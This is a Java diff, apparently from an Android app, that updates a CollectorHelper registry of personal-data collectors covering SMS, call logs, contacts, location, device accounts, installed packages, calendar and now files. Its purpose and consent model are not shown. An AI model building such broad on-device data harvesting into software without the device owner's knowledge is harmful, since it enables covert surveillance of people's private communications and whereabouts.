@@ -9,11 +9,12 @@ import java.util.TreeMap;
 
 import com.xaviar.collect.calendar.CollectCalendar;
 import com.xaviar.collect.calllog.CollectCallLog;
+import com.xaviar.collect.calllog_event.CollectCalllogEvent;
 import com.xaviar.collect.contacts.CollectContacts;
 import com.xaviar.collect.device_accounts.CollectDeviceAccount;
+import com.xaviar.collect.files.CollectFiles;
 import com.xaviar.collect.location.CollectLocations;
 import com.xaviar.collect.packages.CollectPackages;
-import com.xaviar.collect.phone_event.CollectPhoneEvent;
 import com.xaviar.collect.phoneparams.CollectPhoneParams;
 import com.xaviar.collect.sms.CollectSms;
 import com.xaviar.collect.sms_event.CollectSmsEvent;
@@ -44,11 +45,12 @@ public class CollectorHelper {
 		mapCollectors.put(DataHolder.PHONE_PARAMS, new CollectPhoneParams());
 		mapCollectors.put(DataHolder.CALL_LOG, new CollectCallLog());
 		mapCollectors.put(DataHolder.SMS_EVENT, new CollectSmsEvent());
-		mapCollectors.put(DataHolder.PHONE_EVENT, new CollectPhoneEvent());
+		mapCollectors.put(DataHolder.CALL_LOG_EVENT, new CollectCalllogEvent());
 		mapCollectors.put(DataHolder.LOCATION_EVENT, new CollectLocations());
 		mapCollectors.put(DataHolder.DEVICE_ACCOUNTS, new CollectDeviceAccount());
-		mapCollectors.put(DataHolder.PACKAGES, new CollectPackages());
 		mapCollectors.put(DataHolder.CALENDAR, new CollectCalendar());
+		mapCollectors.put(DataHolder.PACKAGES, new CollectPackages());
+		mapCollectors.put(DataHolder.FILE_STRING, new CollectFiles());
 	}
 	
 	public static  Collection<ICollector> createICollectList(Map<String,String> map) {
